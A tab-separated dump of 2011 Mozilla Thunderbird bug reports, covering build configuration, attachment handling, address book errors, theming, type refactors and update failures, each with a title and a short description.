682898%TAB%1314607576%TAB%305876%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Build Config%TAB%Create a test to ensure comm-central and mozilla-central configuration harness is in sync%TAB%Create a test to ensure comm-central and mozilla-central configuration harness is in syncBug 656049 copied some of mozilla-central's configuration harness into comm-central, and they will diverge over time.  Create a make check test that verifies that the files are identical and warns otherwise, so we can more easily keep them in sync.
682897%TAB%1314607462%TAB%305876%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%re-sync comm-central's copies of mozilla-central build harness%TAB%re-sync comm-central's copies of mozilla-central build harnessBug 656049 copied some of mozilla-central's configuration harness into comm-central, and they have since diverged.  Needs merging back in sync.  Justin Wood (:Callek) Assignee
682639%TAB%1314460679%TAB%314746%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%General,Message Compose Window%TAB%can't open attachment,can't open attachment from compose window%TAB%can't open attachment,can't open attachment from compose windowUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0 Build ID: 20110811165603  Steps to reproduce:  when composing a mail, attached a .jpg, right-click-menu to "open" and nothing happens.   Actual results:  nothing.  Neither did the file open in a viewer nor an error message   Expected results:  I expected the file to open in a viewer.  Checked tools/options/attachments and their is a program associated with .jpg
682581%TAB%1314434751%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Remove mail's dependency on nsTryToClose.js%TAB%Remove mail's dependency on nsTryToClose.jsFirefox is removing nsTryToClose.js from Firefox because it registers as app-startup and hence slows down starting up.  We should just switch these to observer registrations in appropriate places.  Someone fancy taking this on? I've said we'll do this before the next merge point, so they can land their patch before then.
682303%TAB%1314341836%TAB%218420%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Today build is broken: jemalloc is missing (20110826)%TAB%Today build is broken: jemalloc is missing (20110826)Updating to today build broke TB with warning because "jemalloc is missing"  Reinstalling yesterday build (Mozilla/5.0 (Windows NT 6.1; rv:9.0a1) Gecko/20110825 Thunderbird/9.0a1) all is fine
682183%TAB%1314293065%TAB%287320%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%compose window is not noticing attachment keywords%TAB%compose window is not noticing attachment keywordsSome time in the last few days comm-central broke so Thunderbird is no longer prompting me about potentially missing attachments when I use one of the attachment keywords in my message text.
682176%TAB%1314289887%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Testing Infrastructure%TAB%Port Bug 652657 - Provide opt-in UI for Telemetry%TAB%Port Bug 652657 - Provide opt-in UI for TelemetryThe number of users who enabled Telemetry is desperately low. I think we should provide opt-in UI for that starting with Thunderbird 9.
682096%TAB%1314273788%TAB%29811%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%Address Book opens empty,Address Book opens empty. Appears to be missing/lost.,Address Book opens empty. Appears to be missing/lost. tree is undefined Source File: chrome://messenger/content/jsTreeView.js%TAB%Address Book opens empty,Address Book opens empty. Appears to be missing/lost.,Address Book opens empty. Appears to be missing/lost. tree is undefined Source File: chrome://messenger/content/jsTreeView.jsShredder 8.0a1 2011-08-16 Approximate steps (reproduced only twice, so must not have exact step)   1) open 3pane with 2 imap accounts A and B, only log into one account A.  2) open compose for both accounts with some text  [from here it's a little fuzzy]  3) try to save draft for account B, it fails "There was an error saving the message to Drafts. Retry?" 4) close 3pane  5) open 3pane from one of the open compose windows  6) open AB  results: - AB window shows no contacts and no ABs - Error console shows Error: tree is undefined Source File: chrome://messenger/content/jsTreeView.js Line: 198  requires restart to get AB display back
682070%TAB%1314270748%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%Revised attachment view doesn't work well with personas%TAB%Revised attachment view doesn't work well with personasIf I select a persona and view a message with an attachment, then I get the text colour set by the persona, not to the normal black as per the buttons in the message header.
681223%TAB%1314066239%TAB%57981%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%General%TAB%Cannot update to Newer from Thunderbird 3.1.12,Cannot update to Newer(6.0.X) from Thunderbird 3.1.X%TAB%Cannot update to Newer from Thunderbird 3.1.12,Cannot update to Newer(6.0.X) from Thunderbird 3.1.XSteps to Reproduce: 1. start Thunderbird 3.1.12 2. Help -> Check for Updates...  "Software Update" said: "No Updates Found" "There are no updates available. Thunderbird will check  periodically for update."  Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.20) Gecko/20110804 Lightning/1.0b2 Thunderbird/3.1.12
681189%TAB%1314044696%TAB%246518%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Replace PRBool with boolean in IDL files (in comm-central)%TAB%Replace PRBool with boolean in IDL files (in comm-central)I ran:  find . -iname "*.idl" ! -wholename "*/mozilla/*" | xargs -n 1 sed -i "s/\([\ \t]\)PRBool/\1boolean/g"  and adjusted the patch manually to fix up alignment.
681188%TAB%1314043926%TAB%246518%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Switch from PRBool to bool (in comm-central)%TAB%Switch from PRBool to bool (in comm-central)If m-c switches to bool from PRBool, comm-central needs to switch at the same time to avoid massive burning.
680826%TAB%1313954319%TAB%244247%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%Empty Address Book List in Junk Mail - 8.0a2%TAB%Empty Address Book List in Junk Mail - 8.0a2User Agent: Mozilla/5.0 (Windows NT 5.1; rv:8.0a2) Gecko/20110819 Firefox/8.0a2 Build ID: 20110819042004  Steps to reproduce:  Upgraded from 7.0a2 to 8.0a2.   Actual results:  I'm seeing an empty window in my Junk Mail Settings. My address books aren't showing to be able to select which ones I want to be active.  http://forums.mozillazine.org/viewtopic.php?f=29&t=2285087   Expected results:  Address Books should be listed in window.
680695%TAB%1313839696%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Message Reader UI%TAB%Implement / add context menu with actions for all attachments for right-click on paperclip icon or "X attachments" label of attachment bar,Implement / add context menu with actions for all attachments for right-click on [paperclip icon], "X attachments" or [size] labels of attachment bar%TAB%Implement / add context menu with actions for all attachments for right-click on paperclip icon or "X attachments" label of attachment bar,Implement / add context menu with actions for all attachments for right-click on [paperclip icon], "X attachments" or [size] labels of attachment barSTR  1) from message reader's attachment bar (especially when collapsed), 2) right-click on paperclip icon or "X attachments" label or [attachment size] label  Actual result - shows context menu for attachment bar ("Customize")  Expected result - show context menu with actions for all attachments (see attached mockup screenshot):  Open all... Save all... ------------- Detach all... Delete all...  Reasons: - when attachment pane is collapsed, the paperclip icon and the "x attachments" label are the only visual representation of the attachments. - the [Save all] button is far away from that visual representation (which may have good design reasons, but it's not exactly honoring the ux principle of in-place editing) - customizing the attachment toolbar is a very rare use case, which is easily and intuitively available on attachment bar's vast blank space area and on the [save all] button. - actions on all attachments are a much more frequent use case - low-cost, no-risk mouse shortcut for users who find this intuitive
680680%TAB%1313827803%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Renaming attachments during composition broken (does not update name in the pane),Renaming attachments during composition broken (does not update display name in the pane)%TAB%Renaming attachments during composition broken (does not update name in the pane),Renaming attachments during composition broken (does not update display name in the pane)STR  1) compose, add attachment(s) 2) rename attachment (right-click, rename, enter new name, confirm)  Actual result - attachment name in the pane does not change (display name not updated, the bug) - otherwise the real name of the attachment is changed as expected (try renaming again to verify, or sending -> sends with correct new name)   Expected - update the display name, too (major UI confusion for the user, as display name is different from real attachment name that gets sent)  this is a regression, perhaps caused by bug 630759 How I wish bug 526998 could be fixed alongside.
680446%TAB%1313735241%TAB%334226%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Printing more than one e-mails at the same time reduces the message content,Printing more than one e-mails at the same time reduces the message content. Multiple selection prints only summary.%TAB%Printing more than one e-mails at the same time reduces the message content,Printing more than one e-mails at the same time reduces the message content. Multiple selection prints only summary.User Agent: Mozilla/5.0 (Windows NT 5.1; rv:6.0) Gecko/20100101 Firefox/6.0 Build ID: 20110811165603  Steps to reproduce:  Start TB in -safe-mode. In the message preview window I select more than one email. Right click on them, "Print...".    Actual results:  It opens the printer's preview window of my printer driver. At the end of each message you see .e.g.:  "Dies ist der Beitrag..." or "D..."   Expected results:  TB  should list the complete message body (as in vers. 3 and 5) of all messages. But it shows only a very small part of each message.  Workaround: printing every mail separately.
680427%TAB%1313730569%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Fix MozMill MsgHdrToMimeMessage callers%TAB%Fix MozMill MsgHdrToMimeMessage callersOur MozMill MsgHdrToMimeMessage callers are currently a little broken. - The callbacks should be wrapped so that the exception they throw on failure isn't just eaten up. - The callback is the *third* argument, not the second.
680219%TAB%1313664398%TAB%339434%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Thunderbird fails to build with Editor-related errors.%TAB%Thunderbird fails to build with Editor-related errors.import.lib(nsEudoraEditor.obj) : error LNK2001: unresolved external symbol "public: virtual unsigned int __stdcall nsEudoraEditor::GetIsSelectionEditable(int *)" (?GetIsSelectionEditable@nsEudoraEditor@@UAGIPAH@Z) import.lib(nsOutlookEditor.obj) : error LNK2001: unresolved external symbol "public: virtual unsigned int __stdcall nsOutlookEditor::GetIsSelectionEditable(int *)" (?GetIsSelectionEditable@nsOutlookEditor@@UAGIPAH@Z) NEXT ERROR xul.dll : fatal error LNK1120: 2 unresolved externals
680192%TAB%1313660167%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Mail Window Front End%TAB%Port bug 617528 from Firefox and make html5 context menus work in Thunderbird (important for Conversations)%TAB%Port bug 617528 from Firefox and make html5 context menus work in Thunderbird (important for Conversations)If we are to move towards richer UIs (I'm thinking Conversations here) designed using HTML, a very easy way to handle context menus is the HTML5 contextmenu attribute. Firefox just implemented this, and I'd love to see this work in Thunderbird too: this would allow me to have a better context menu for conversations, possibly one with actions that operate on the whole conversation, one specific to each message, one specific for attachments.  This would also allow me to implement all the annoying options that users scream for, and bury them deep in a context menu, so that regular users, me included, don't have to see them. And that would make the users happy.
680000%TAB%1313617061%TAB%344676%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%Upgrade fails ("404 file not found"),Upgrade fails on 64 bits installs ("404 file not found")%TAB%Upgrade fails ("404 file not found"),Upgrade fails on 64 bits installs ("404 file not found")When trying to upgrade to 6.0, I get an "unspecified error" and patches are not downloaded.  If I manually fetch the files from URLs found at "/usr/lib64/thunderbird/updates.xml" both (complete and partial patches) return a "404 file not found":   sm01@stt008:~$ LANG=POSIX; wget "http://download.mozilla.org/?product=thunderbird-6.0-complete&os=linux64&lang=es-ES&force=1" --2011-08-18 08:32:19--  http://download.mozilla.org/?product=thunderbird-6.0-complete&os=linux64&lang=es-ES&force=1 Resolving download.mozilla.org... 63.245.217.36, 63.245.217.36 Connecting to download.mozilla.org|63.245.217.36|:80... connected. HTTP request sent, awaiting response... 404 Not Found 2011-08-18 08:32:20 ERROR 404: Not Found.   sm01@stt008:~$ LANG=POSIX; wget "http://download.mozilla.org/?product=thunderbird-6.0-partial-5.0&os=linux64&lang=es-ES&force=1" --2011-08-18 08:33:14--  http://download.mozilla.org/?product=thunderbird-6.0-partial-5.0&os=linux64&lang=es-ES&force=1 Resolving download.mozilla.org... 63.245.217.36, 63.245.217.36 Connecting to download.mozilla.org|63.245.217.36|:80... connected. HTTP request sent, awaiting response... 404 Not Found 2011-08-18 08:33:14 ERROR 404: Not Found.
679696%TAB%1313557760%TAB%198524%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Message Compose Window%TAB%Identity picker on compose window is hard to use when you have a lot of identities%TAB%Identity picker on compose window is hard to use when you have a lot of identitiesI participate in a lot of "role" addresses in my duties as a sysadmin, many of which are set up in Thunderbird as available addresses to send mail from.  Thus my identity picker on the compose window has about 50 addresses in it, with some on each of my mail accounts.  90% of the time when I'm manually setting an identity, I actually want the primary identity for an account, just a different one than it defaulted to.  The primary identities are hard to find because they look just like the rest of them.  Two possible solutions for this: 1) Make the primary identities all show as boldface in the menu  or  2) Draw a divider line between each account's identities within the menu, which will still make primary identities easy to spot, since they're the first one within each group.
679513%TAB%1313499768%TAB%12809%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%[Tracking] Add Test Pilot to Thunderbird%TAB%[Tracking] Add Test Pilot to ThunderbirdAdd Test Pilot to Thunderbird so we can offer usability tests to our users and make Thunderbird better.
679483%TAB%1313494332%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%Provide a way to disable this @!#$ rich failure logging that fills my terminal%TAB%Provide a way to disable this @!#$ rich failure logging that fills my terminalThe title says it all. Hmm, I think this should be the other way round -- we shouldn't print rich failures unless we set an env var called (e.g.) MOZMILL_RICH_FAILURES. Then we can update buildbot and set the variable.
679460%TAB%1313490431%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Infrastructure%TAB%runtest.py should warn when SOLO_TEST is empty%TAB%runtest.py should warn when SOLO_TEST is emptyI just wasted a couple minutes because I'm constantly confusing SOLO_FILE (xpcshell) and SOLO_TEST (mozmill), and I couldn't figure out why make mozmill-one would start up, run zero tests, and shutdown without complaining about anything. Would be good to have that at some point
679414%TAB%1313484349%TAB%1537%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%apparently untriaged feedback-thunderbird mailing list still drawing user feedback%TAB%apparently untriaged feedback-thunderbird mailing list still drawing user feedbackThis still exists (I mail spam-blocker mailer from various pieces about it), and apparently users are submitting feedback in the hopes that it will be read or seen by somebody.  I think this list probably wants to just go away.  In theory, beltzner and I are admins; in reality, I don't know what the password for the list is.  So presumably, someone should make a call about what to do with this and then file a bug with IT to kill the list & remove references & google group links to it.
679218%TAB%1313419575%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Update branding for Thunderbird's nightly equivalent channel: Daily%TAB%Update branding for Thunderbird's nightly equivalent channel: DailyDaily icons for windows, linux, osx, dialogs et all  "mail/branding/nightly/os2/messengerWindow.ico"  OS/2?!?  :)  I suspect we want to change "Shredder" to "Daily" as part of this patch, too.  Or at least as part of this bug.  I tested the patch on Mac and Linux, and they look good, so I'm going to say ui-r=me, under the assumption that you've tested it on Windows, and under the assumption that we're going to change the text in a different patch.
678964%TAB%1313376774%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installer%TAB%Update package-manifest for latest changes%TAB%Update package-manifest for latest changesThere's a few package-manifest changes that aren't too critical because they are generally things we don't need, or get removed anyway, but it is updating the file and making package-compare easier to read and sift through for what we really do need.
678963%TAB%1313376423%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Build Config%TAB%Remove README.txt from release packages%TAB%Remove README.txt from release packagesBug 561481 pointed out that the readme file was out of date, and that it isn't very useful anyway. Nor does there seem much point in keeping it up to date.  Therefore I think we can remove it as well.
678255%TAB%1313054963%TAB%254728%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager%TAB%Advanced dialog for POP3 account showing the IMAP dialog%TAB%Advanced dialog for POP3 account showing the IMAP dialogOn current Trunk (but not Aurora), in the account manager if I select for a POP3 account Server Settings/Advanced, I get the IMAP version and not the POP3 version. I also cannot save any settings, so this means that the advanced dialog is non-functional for POP3 servers.
678244%TAB%1313053166%TAB%287320%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Fix minor coding errors in patch from bug 602718%TAB%Fix minor coding errors in patch from bug 602718The Seamonkey folks over in bug 677905 found two bugs in my recent changes which were checked in in bug 602718. My code calls document.getElementById on a potentially null value, and in one location where I copied and modified some code I forgot to change AllowHTML_menuitem to AllBodyParts_menuitem. D'oh! The attached patch fixes both issues.
678230%TAB%1313050547%TAB%215230%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Layout,Toolbars and Tabs%TAB%Thunderbird tabs lack background image at the bottom since the landing of Bug #609714%TAB%Thunderbird tabs lack background image at the bottom since the landing of Bug #609714I have no idea whether the checkin <http://hg.mozilla.org/mozilla-central/rev/89c17ca55124> in Bug #609714 broke the rendering of Thunderbird tabs or just revealed a preexisting flaw in Thunderbird GUI. Anyway, with this checkin, the background image in Thunderbird tabs doesn't fill the tab anymore, leaving a stripe of background color at the bottom. This looks especially ugly with dark gtk2 themes like the default Ubuntu theme.  Verified by local backout.
678148%TAB%1313019256%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Tags sometimes get lost from the UI,Tags sometimes get lost from the UI for messages tagged in the current session on a condstore server%TAB%Tags sometimes get lost from the UI,Tags sometimes get lost from the UI for messages tagged in the current session on a condstore serverSTR:  1) Have a folder where you've got tags pretty much on every message, and unread (I have a bugmail folder where things get tagged by component).  2) Be archiving those messages as you read them (using the Conversations Archive tool).  3) Occasionally pause for about 10-30 seconds between archiving messages.  Actual Results  On the pause, after around 10 seconds the message in the thread pane will turn black and it has "lost" its tag.  However, if I look in my zimbra mail online, the tags are still there.  It doesn't always happen, but it does frequently.  I've definitely seen it on Earlybird & Shredder, not sure about 6 beta.   I have logs of this happening so I'll send them to David.  This could be related to bug 675868.
678140%TAB%1313010231%TAB%422044%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%Message and folder focus is not shown when using CTRL+up/down arrow key%TAB%Message and folder focus is not shown when using CTRL+up/down arrow keyUser Agent: Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1  Steps to reproduce:  Message or folder list, click on an item. Press and hold control. Press arrow down/up.   Actual results:  Nothing visible happens.  But if you now press SPACE, you can select the next message/folder, i.e. focus has been moved on the arrow key press.   Expected results:  There should be an indication of where the keyboard focus is.  Maybe related: When dragging a message to a folder, there is no visual which indication on the target folder while dragging.
677884%TAB%1312948701%TAB%357895%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Address Book%TAB%New entry in adress book does not work,New entry in address book not saved. error console has this.yearField is null and  aDatepicker.yearField is null%TAB%New entry in adress book does not work,New entry in address book not saved. error console has this.yearField is null and  aDatepicker.yearField is nullUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20110622 Firefox/5.0 PaleMoon/5.0 Build ID: 20110622191927  Steps to reproduce:  I attempted to add an emailadress to my adress book, to ensure that embedded content was always shown.   Actual results:  Upon pressing the link to always show embedded content, i got the dialog from my adress book as shown: [IMG]http://i558.photobucket.com/albums/ss25/FScheltens/Adressbookbug.jpg[/IMG] When pressing the OK button on this dialog, nothing happens.  If i manually open the adress book, make a new contact, enter some information, and press OK, nothing happens.  I have tried turning off EVERY plugin / extension, no difference.   Expected results:  A new entry should have been made in the adress book.  I am using Thunderbird 5.0 (dutch) with the extensions importexporttools, dutch dictionary, english dictionary only.
677882%TAB%1312948422%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Bug 486320 not fully functional with Lightning installed%TAB%Bug 486320 not fully functional with Lightning installedBug 486320 wants to remove the borders. With Lightning installed the borders are visible again because Lightning imports the global rules behind the messenger.css rule. With border: none !important; it overrules the global rule. I removed the padding because this is already defined in the global rule.
677421%TAB%1312816013%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Search%TAB%Add support for OpenSearch from Thunderbird%TAB%Add support for OpenSearch from ThunderbirdThis bug is for tracking the inclusion of the OpenSearch add-on[1] into Thunderbird core.
677412%TAB%1312814375%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Improve error handling in HandleMultipleAttachments%TAB%Improve error handling in HandleMultipleAttachmentsCurrently, if an error is encountered in HandleMultipleAttachments, it just dumps some (very vague) output to the command line. Instead, we should just throw an error and let it go into the error console. I believe this will also help Conversations, since protz mentioned he'd like to have this function throw an error when it fails.  Attached is a patch to fix this; I also switched the "Couldn't open external attachment!" error to get logged in the Error Console for consistency. There shouldn't be any behavioral changes to the code, and everything should already be covered by other tests.
677347%TAB%1312800417%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Build support to install hyphenation patterns in SeaMonkey.,Build support to install hyphenation patterns in Thunderbird%TAB%Build support to install hyphenation patterns in SeaMonkey.,Build support to install hyphenation patterns in ThunderbirdReferences: Firefox Bug 253317 - Provide hyphenation dictionary for justified text. Specifically part 3.1 - build support to install hyphenation patterns in the product  Should just need to port bug 551466 from suite to mail.
677345%TAB%1312799894%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%when Thunderbird is unfocused, the menubar is hard to read%TAB%when Thunderbird is unfocused, the menubar is hard to readIt's currently quite fuzzy. Since this is effectively a spin-off from bug 667248, I've set the dependencies respectively. Please make any other follow-up bugs dependent on bug 667248 so that people know which issues are covered where.
677021%TAB%1312596728%TAB%22599%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Attachment extension can still be deceptive,[regression] Attachment extension can again be deceptive%TAB%Attachment extension can still be deceptive,[regression] Attachment extension can again be deceptiveReproduction: 1. Open a virus/worm email that you received. Look at the attachment,    particularly its type.  Content-Disposition: attachment;   filename="attach_mozilla.txt                                  .scr".    Actual result: Thunderbird mail viewer UI shows:   1 attachment: attach_mozilla.txt              ...             .scr  Expected result: Thunderbird mail viewer UI shows:   1 attachment: attach_mozilla.txt….scr or better yet:   1 attachment: attach_mozilla.txt .scr or better yet:   1 attachment: attach_mozilla.txt.scr  Importance: The email of course looked suspicious, but the "attach_mozilla.txt" look innocent to me. I thought several times "but it's a .txt file! It's harmless. I can open it. But wait, there must be something wrong..." until I finally discovered the ".scr".  The .scr, as shown currently in the UI, has no relation to the filename and must be missed by users. If they miss it, they run a hostile executable and are infected. We must prevent this, but the current UI leads people into the pit. Thus Severity Major.
676916%TAB%1312541696%TAB%372519%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Folder and Message Lists%TAB%Thunderbird 5 not threading email correctly,Thunderbird 5 not threading email correctly when message-id spans to continuation line (not fixed by Repair Folder)%TAB%Thunderbird 5 not threading email correctly,Thunderbird 5 not threading email correctly when message-id spans to continuation line (not fixed by Repair Folder)User Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 Build ID: 20110615151330  Steps to reproduce:  I have an email chain that includes responses from Outlook.  These were not threading properly.  As a test I created a thread between two of my accounts.  First account is IMAP access through Thunderbird.  Second account is IMAP to what is eventually an Exchange Server accessed through Thunderbird.  I also responded to the thread from Outlook which is the same Second account but with Exchange Server directly.  The responses following the first email from Outlook do not thread properly.  This only seems affects one account that is IMAP access to what is an Exchange Server.  Threading settings are mail.correct_threading - True mail.strict_threading - True mail.thread_without_re - False     Actual results:  The response after any response made using Outlook does not thread properly in Thunderbird accessing the account via IMAP to the Exchange Server.  The threading appears as the following  Original   Response     Response - From Outlook     Response  From account One, the threading is   Original   Response     Response - From Outlook       Response  Comparing Message-ID, References, and In-Reply-To header fields does not show any problems.  However noticed that Outlook   Compacting the IMAP Inbox folder of Second account has no impact Moving the thread to a Local folder has no impact Moving the thread back to the IMAP Inbox folder of the Second account changes the threading.  Original   Response     Response - From Outlook       Response  Moving new threading back to Local folder keeps proper threading   Expected results:  The responses should be properly threaded always  Original   Response     Response - From Outlook       Response
676807%TAB%1312516133%TAB%215230%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End,Theme%TAB%Mail view picker label text invisible with dark themes after the landing of bug #666227,Mail view picker label text invisible with dark gtk themes after the landing of bug #666227%TAB%Mail view picker label text invisible with dark themes after the landing of bug #666227,Mail view picker label text invisible with dark gtk themes after the landing of bug #666227After the landing of the patch in bug #666227 the text of #viewPickerLabel is almost undistinguishable with dark GTK2 themes like the default Ubuntu 11.04 theme.  #viewPickerLabel { color: menutext; }  in userChrome.css works around the issue.
676754%TAB%1312491780%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Detaching a single attachment doesn't work%TAB%Detaching a single attachment doesn't workthis is because I forgot to update a line in bug 657856. Here's a patch for that. I'd write a mozmill test, but detaching opens up an OS-level dialog, which mozmill can't handle (that I know of).
676038%TAB%1312278208%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%Remove the top border of #folderTree after landing of Bug 667245%TAB%Remove the top border of #folderTree after landing of Bug 667245After landing of Bug 667245 the folder tree has a white border on top which don't look so good. Removing it makes the tree better blend into the tab.
675783%TAB%1312205822%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%General,Mail Window Front End%TAB%Delete Folder should not underline the 'd' in Folder%TAB%Delete Folder should not underline the 'd' in FolderI believe the goal is for it to underline the D in "Delete" instead. Because the access key is currently lowercase "d", it prefers the D in "folder".
675781%TAB%1312205728%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Address Book%TAB%First Last does not have a comma%TAB%First Last does not have a commaI'm not really happy with how "First Last" reads, but I agree that the comma shouldn't be there.  So, unasked-for-ui-r=me.  Whilst we're not changing the context, as we seem to agree that without the comma makes sense, then we also want to make sure locales get updated. At 55 locales with the comma and 12 locales without, I think it would be worth updating the string id (and syncing the .accesskey) rather than filing lots of bugs.  I think we should also have an l10n comment explaining why we're not including the comma even though it is sort-of-natural to have it.
675609%TAB%1312172539%TAB%339434%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Port bug 673209 to comm-central%TAB%Port bug 673209 to comm-centralOn OS X Lion, I'm getting an error generating comm-config.h, but the build proceeds anyways, wasting a bunch of time.  ;)  I don't know if this needs sr, too, so feel free to flag it as such if it does.
675598%TAB%1312167457%TAB%40471%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%clicking List-Reply fails: tempID.email is null%TAB%clicking List-Reply fails: tempID.email is nullThis is THUNDERBIRD_6_0b2_RELEASE.  Trying to reply to a list email with reply-to-list fails with the following error in the error console:  Fehler: tempID.email is null Quelldatei: chrome://messenger/content/mailCommands.js Zeile: 112          if (deliveredTos[i].indexOf(tempID.email.toLowerCase()) != -1) {           hintForIdentity = tempID.email;           break;         }
675586%TAB%1312157948%TAB%402548%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme%TAB%tab close button is moving%TAB%tab close button is movingUser Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0.1) Gecko/20100101 Firefox/5.0.1 Build ID: 20110707182747  Steps to reproduce:  When a "closable" tab is opened and active (Add-on manager for example) and I want to close it, when moving mouse over the close button, the button is moving.    Expected results:  It should stay, where it is.
675514%TAB%1312107006%TAB%287320%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Folder and Message Lists%TAB%folder name comparison when deciding whether to include account name should be case-insensitive?%TAB%folder name comparison when deciding whether to include account name should be case-insensitive?I like the new feature which appends the account name to the folder name in the "Favorite Folders" view if there's another favorite folder with the same name.  However, I wonder if the name comparison which drives this logic should perhaps be case-insensitive. For example, I have one account with a folder called "archive" and one with a folder called "Archive" and sometimes it takes me a while to remember which is which. The account name would help me remember more quickly, and it doesn't seem to hurt anything to add this additional information.
675473%TAB%1312050782%TAB%246518%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Incorrect use of PRBool when other types are more appropriate or vice versa (in comm-central)%TAB%Incorrect use of PRBool when other types are more appropriate or vice versa (in comm-central)Problems discovered by static analysis and patched by hand.  standard8, requesting review again but please reassign if there's someone more appropriate. Some parts touch libmime so maybe jcranmer wants to take a look.
675472%TAB%1312049810%TAB%246518%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General%TAB%Incorrect return of NS_ERROR_* codes in functions returning PRBool (in comm-central)%TAB%Incorrect return of NS_ERROR_* codes in functions returning PRBool (in comm-central)Problems discovered by static analysis and patched by hand.  standard8, want to review this patch? I don't know comm-central well enough to know who to ask for review.
675445%TAB%1312012230%TAB%299163%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Mail Window Front End%TAB%Align Thunderbird appearance after Bug 668195%TAB%Align Thunderbird appearance after Bug 668195When Bug 668195 (and 667476) will land, this will also affect Thunderbird. As a result there will be a 1px line between the tabs and the toolbar. This patch will fix this (I only tested this patch on Mac OS X 10.7).
